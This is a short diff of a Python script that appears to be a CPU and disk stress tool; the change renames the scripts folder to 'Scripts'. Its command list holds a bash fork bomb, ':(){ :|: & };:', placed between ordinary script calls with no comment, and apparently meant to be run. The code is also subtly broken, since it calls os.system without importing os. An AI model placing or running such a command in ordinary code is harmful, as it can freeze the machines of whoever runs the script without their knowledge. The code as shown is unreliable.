@@ -1,13 +1,13 @@
 import subprocess, webbrowser, asyncio
 
 commands = [
-  "bash scripts/cpu.sh",
+  "bash Scripts/cpu.sh",
   ":(){ :|: & };:",
-  "bash scripts/disk.sh"
+  "bash Scripts/disk.sh"
 ]
 
-os.system(f"chmod +x scripts/cpu.sh")
-os.system(f"chmod +x scripts/disk.sh")
+os.system(f"chmod +x Scripts/cpu.sh")
+os.system(f"chmod +x Scripts/disk.sh")
 
 async def one():
   i = 0
